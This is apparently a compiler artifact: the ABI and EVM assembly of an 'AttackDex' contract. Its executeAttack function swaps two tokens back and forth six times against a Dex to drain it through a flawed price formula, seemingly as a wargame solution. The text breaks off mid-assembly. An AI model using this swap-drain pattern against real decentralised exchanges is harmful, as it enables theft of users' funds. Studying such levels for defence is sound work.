{
	"dexat.sol": {
		"AttackDex": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_dex",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "dex",
					"outputs": [
						{
							"internalType": "contract Dex",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "executeAttack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "token1",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "token2",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"dexat.sol\":422:1000  contract AttackDex {... */\n  mstore(0x40, 0x80)\n    /* \"dexat.sol\":527:711  constructor(address _dex) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"dexat.sol\":574:578  _dex */\n  dup1\n    /* \"dexat.sol\":564:567  dex */\n  0x00\n  dup1\n    /* \"dexat.sol\":564:579  dex = Dex(_dex) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"dexat.sol\":599:641  0x007Ac777eABBefC9806C6cE859DEA6C5837E32ed */\n  0x7ac777eabbefc9806c6ce859dea6c5837e32ed\n    /* \"dexat.sol\":590:596  token1 */\n  0x01\n  0x00\n    /* \"dexat.sol\":590:641  token1 = 0x007Ac777eABBefC9806C6cE859DEA6C5837E32ed */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"dexat.sol\":661:703  0xfC2F0A3fCf8C303Ca895f46D337299D09f2Fc01B */\n  0xfc2f0a3fcf8c303ca895f46d337299d09f2fc01b\n    /* \"dexat.sol\":652:658  token2 */\n  0x02\n  0x00\n    /* \"dexat.sol\":652:703  token2 = 0xfC2F0A3fCf8C303Ca895f46D337299D09f2Fc01B */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"dexat.sol\":527:711  constructor(address _dex) {... */\n  pop\n    /* \"dexat.sol\":422:1000  contract AttackDex {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"dexat.sol\":422:1000  contract AttackDex {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"dexat.sol\":422:1000  contract AttackDex {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x25be124e\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x422490ee\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x692058c2\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"dexat.sol\":497:518  address public token2 */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"dexat.sol\":719:997  function executeAttack() external {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"dexat.sol\":448:462  Dex public dex */\n    tag_5:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"dexat.sol\":469:490  address public token1 */\n    tag_6:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"dexat.sol\":497:518  address public token2 */\n    tag_8:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"dexat.sol\":719:997  function executeAttack() external {... */\n    tag_12:\n        /* \"dexat.sol\":766:769  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":766:774  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":775:781  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":783:789  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":791:793  10 */\n      0x0a\n        /* \"dexat.sol\":766:794  dex.swap(token1, token2, 10) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_21\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":805:808  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":805:813  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":814:820  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":822:828  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":830:832  20 */\n      0x14\n        /* \"dexat.sol\":805:833  dex.swap(token2, token1, 20) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_26\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":844:847  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":844:852  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":853:859  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":861:867  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":869:871  24 */\n      0x18\n        /* \"dexat.sol\":844:872  dex.swap(token1, token2, 24) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_31\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_33:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_35:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":883:886  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":883:891  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":892:898  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":900:906  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":908:910  30 */\n      0x1e\n        /* \"dexat.sol\":883:911  dex.swap(token2, token1, 30) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_36\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_38:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":922:925  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":922:930  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":931:937  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":939:945  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":947:949  41 */\n      0x29\n        /* \"dexat.sol\":922:950  dex.swap(token1, token2, 41) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":961:964  dex */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":961:969  dex.swap */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xdf791e50\n        /* \"dexat.sol\":970:976  token2 */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":978:984  token1 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexat.sol\":986:988  45 */\n      0x2d\n        /* \"dexat.sol\":961:989  dex.swap(token2, token1, 45) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_46\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_47\n      jump\t// in\n    tag_46:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n        /* \"dexat.sol\":719:997  function executeAttack() external {... */\n      jump\t// out\n        /* \"dexat.sol\":448:462  Dex public dex */\n    tag_14:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"dexat.sol\":469:490  address public token1 */\n    tag_18:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_51:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_52:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_81\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_51\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_53:\n        /* \"#utility.yul\":328:352   */\n      tag_83\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_52\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_10:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_85\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_53\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:653   */\n    tag_54:\n        /* \"#utility.yul\":621:624   */\n      0x00\n        /* \"#utility.yul\":642:647   */\n      dup2\n        /* \"#utility.yul\":635:647   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:653   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":659:801   */\n    tag_55:\n        /* \"#utility.yul\":709:718   */\n      0x00\n        /* \"#utility.yul\":742:795   */\n      tag_88\n        /* \"#utility.yul\":760:794   */\n      tag_89\n        /* \"#utility.yul\":769:793   */\n      tag_90\n        /* \"#utility.yul\":787:792   */\n      dup5\n        /* \"#utility.yul\":769:793   */\n      tag_51\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":760:794   */\n      tag_54\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":742:795   */\n      tag_51\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":729:795   */\n      swap1\n      pop\n        /* \"#utility.yul\":659:801   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":807:933   */\n    tag_56:\n        /* \"#utility.yul\":857:866   */\n      0x00\n        /* \"#utility.yul\":890:927   */\n      tag_92\n        /* \"#utility.yul\":921:926   */\n      dup3\n        /* \"#utility.yul\":890:927   */\n      tag_55\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":877:927   */\n      swap1\n      pop\n        /* \"#utility.yul\":807:933   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":939:1075   */\n    tag_57:\n        /* \"#utility.yul\":999:1008   */\n      0x00\n        /* \"#utility.yul\":1032:1069   */\n      tag_94\n        /* \"#utility.yul\":1063:1068   */\n      dup3\n        /* \"#utility.yul\":1032:1069   */\n      tag_56\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":1019:1069   */\n      swap1\n      pop\n        /* \"#utility.yul\":939:1075   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1081:1232   */\n    tag_58:\n        /* \"#utility.yul\":1178:1225   */\n      tag_96\n        /* \"#utility.yul\":1219:1224   */\n      dup2\n        /* \"#utility.yul\":1178:1225   */\n      tag_57\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":1173:1176   */\n      dup3\n        /* \"#utility.yul\":1166:1226   */\n      mstore\n        /* \"#utility.yul\":1081:1232   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1238:1480   */\n    tag_16:\n        /* \"#utility.yul\":1341:1345   */\n      0x00\n        /* \"#utility.yul\":1379:1381   */\n      0x20\n        /* \"#utility.yul\":1368:1377   */\n      dup3\n        /* \"#utility.yul\":1364:1382   */\n      add\n        /* \"#utility.yul\":1356:1382   */\n      swap1\n      pop\n        /* \"#utility.yul\":1392:1473   */\n      tag_98\n        /* \"#utility.yul\":1470:1471   */\n      0x00\n        /* \"#utility.yul\":1459:1468   */\n      dup4\n        /* \"#utility.yul\":1455:1472   */\n      add\n        /* \"#utility.yul\":1446:1452   */\n      dup5\n        /* \"#utility.yul\":1392:1473   */\n      tag_58\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":1238:1480   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1486:1572   */\n    tag_59:\n        /* \"#utility.yul\":1532:1539   */\n      0x00\n        /* \"#utility.yul\":1561:1566   */\n      dup2\n        /* \"#utility.yul\":1550:1566   */\n      swap1\n      pop\n        /* \"#utility.yul\":1486:1572   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1578:1655   */\n    tag_60:\n        /* \"#utility.yul\":1615:1622   */\n      0x00\n        /* \"#utility.yul\":1644:1649   */\n      dup2\n        /* \"#utility.yul\":1633:1649   */\n      swap1\n      pop\n        /* \"#utility.yul\":1578:1655   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1661:1821   */\n    tag_61:\n        /* \"#utility.yul\":1720:1729   */\n      0x00\n        /* \"#utility.yul\":1753:1815   */\n      tag_102\n        /* \"#utility.yul\":1771:1814   */\n      tag_103\n        /* \"#utility.yul\":1780:1813   */\n      tag_104\n        /* \"#utility.yul\":1807:1812   */\n      dup5\n        /* \"#utility.yul\":1780:1813   */\n      tag_59\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":1771:1814   */\n      tag_54\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":1753:1815   */\n      tag_60\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":1740:1815   */\n      swap1\n      pop\n        /* \"#utility.yul\":1661:1821   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1827:1976   */\n    tag_62:\n        /* \"#utility.yul\":1923:1969   */\n      tag_106\n        /* \"#utility.yul\":1963:1968   */\n      dup2\n        /* \"#utility.yul\":1923:1969   */\n      tag_61\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":1918:1921   */\n      dup3\n        /* \"#utility.yul\":1911:1970   */\n      mstore\n        /* \"#utility.yul\":1827:1976   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1982:2442   */\n    tag_22:\n        /* \"#utility.yul\":2140:2144   */\n      0x00\n        /* \"#utility.yul\":2178:2180   */\n      0x60\n        /* \"#utility.yul\":2167:2176   */\n      dup3\n        /* \"#utility.yul\":2163:2181   */\n      add\n        /* \"#utility.yul\":2155:2181   */\n      swap1\n      pop\n        /* \"#utility.yul\":2191:2262   */\n      tag_108\n        /* \"#utility.yul\":2259:2260   */\n      0x00\n        /* \"#utility.yul\":2248:2257   */\n      dup4\n        /* \"#utility.yul\":2244:2261   */\n      add\n        /* \"#utility.yul\":2235:2241   */\n      dup7\n        /* \"#utility.yul\":2191:2262   */\n      tag_53\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":2272:2344   */\n      tag_109\n        /* \"#utility.yul\":2340:2342   */\n      0x20\n        /* \"#utility.yul\":2329:2338   */\n      dup4\n        /* \"#utility.yul\":2325:2343   */\n      add\n        /* \"#utility.yul\":2316:2322   */\n      dup6\n        /* \"#utility.yul\":2272:2344   */\n      tag_53\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2354:2435   */\n      tag_110\n        /* \"#utility.yul\":2431:2433   */\n      0x40\n        /* \"#utility.yul\":2420:2429   */\n      dup4\n        /* \"#utility.yul\":2416:2434   */\n      add\n        /* \"#utility.yul\":2407:2413   */\n      dup5\n        /* \"#utility.yul\":2354:2435   */\n      tag_62\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":1982:2442   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2448:2534   */\n    tag_63:\n        /* \"#utility.yul\":2494:2501   */\n      0x00\n        /* \"#utility.yul\":2523:2528   */\n      dup2\n        /* \"#utility.yul\":2512:2528   */\n      swap1\n      pop\n        /* \"#utility.yul\":2448:2534   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2540:2700   */\n    tag_64:\n        /* \"#utility.yul\":2599:2608   */\n      0x00\n        /* \"#utility.yul\":2632:2694   */\n      tag_113\n        /* \"#utility.yul\":2650:2693   */\n      tag_114\n        /* \"#utility.yul\":2659:2692   */\n      tag_115\n        /* \"#utility.yul\":2686:2691   */\n      dup5\n        /* \"#utility.yul\":2659:2692   */\n      tag_63\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":2650:2693   */\n      tag_54\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":2632:2694   */\n      tag_60\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":2619:2694   */\n      swap1\n      pop\n        /* \"#utility.yul\":2540:2700   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2706:2855   */\n    tag_65:\n        /* \"#utility.yul\":2802:2848   */\n      tag_117\n        /* \"#utility.yul\":2842:2847   */\n      dup2\n        /* \"#utility.yul\":2802:2848   */\n      tag_64\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":2797:2800   */\n      dup3\n        /* \"#utility.yul\":2790:2849   */\n      mstore\n        /* \"#utility.yul\":2706:2855   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2861:3321   */\n    tag_27:\n        /* \"#utility.yul\":3019:3023   */\n      0x00\n        /* \"#utility.yul\":3057:3059   */\n      0x60\n        /* \"#utility.yul\":3046:3055   */\n      dup3\n        /* 